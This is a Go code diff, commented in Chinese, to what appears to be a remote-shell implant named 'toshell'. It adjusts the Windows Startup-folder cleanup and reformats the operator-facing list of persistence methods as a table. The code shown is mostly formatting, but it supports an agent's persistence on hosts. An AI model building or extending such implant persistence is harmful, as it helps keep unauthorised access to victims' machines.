@@ -236,6 +236,10 @@ func removePersistence(exePath string) (string, int32, string) {
 
 	// 移除启动文件夹快捷方式
 	appData := os.Getenv("APPDATA")
+	if appData == "" {
+		// 与 installStartupFolder 同源兜底：APPDATA 缺失时不能拼出 "\Microsoft\..." 这种根路径
+		appData = os.Getenv("USERPROFILE")
+	}
 	startupDir := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 	os.Remove(filepath.Join(startupDir, "toshell.lnk"))
 	results = append(results, "[✓] Startup Folder shortcut removed")
@@ -261,9 +265,11 @@ func handlePersistence(data string) (string, int32, string) {
 
 	switch req.Action {
 	case "list":
-		methods := listPersistenceMethods()
-		j, _ := json.Marshal(methods)
-		return string(j), 0, ""
+		// 旧实现直接回传 json.Marshal(methods)：操作员在任务回显里看到的是一坨
+		// `[{"name":...}]`，既不好读、又恰好被 executeTask 末尾的整串 GBK→UTF-8
+		// 打成乱码（本次一同修掉）。这里改成稳定的管道分隔表（含表头），字段顺序
+		// 固定为 方法名 | 可靠 | 说明，前端/人工都按同一份顺序读，不再有"字段错位"。
+		return formatPersistenceMethods(listPersistenceMethods()), 0, ""
 	case "install":
 		return installPersistence(req.Method, req.ExePath)
 	case "remove":
@@ -271,4 +277,24 @@ func handlePersistence(data string) (string, int32, string) {
 	default:
 		return "", -1, fmt.Sprintf("未知操作: %s", req.Action)
 	}
+}
+
+// formatPersistenceMethods 把方法列表渲染成人类可读的表格。
+//
+// 为什么用 " | " 分隔而不是对齐列：中文显示宽度是 2、ASCII 是 1，按字节/字符
+// %-20s 补齐在终端和 Web 回显里都会错位；管道分隔的固定字段顺序没有对齐假设。
+// 首行是表头，**不会出现空表头**：方法列表恒非空，长度信息放在末尾一行。
+func formatPersistenceMethods(methods []PersistenceMethod) string {
+	var b strings.Builder
+	b.WriteString("== 持久化方法（启动项）列表 ==\n")
+	b.WriteString("方法名 | 可靠 | 说明\n")
+	for _, m := range methods {
+		reliable := "否"
+		if m.Reliable {
+			reliable = "是"
+		}
+		b.WriteString(fmt.Sprintf("%s | %s | %s\n", m.Name, reliable, m.Description))
+	}
+	b.WriteString(fmt.Sprintf("共 %d 项；安装时把「方法名」作为 method 传给 persistence install。\n", len(methods)))
+	return b.String()
 }
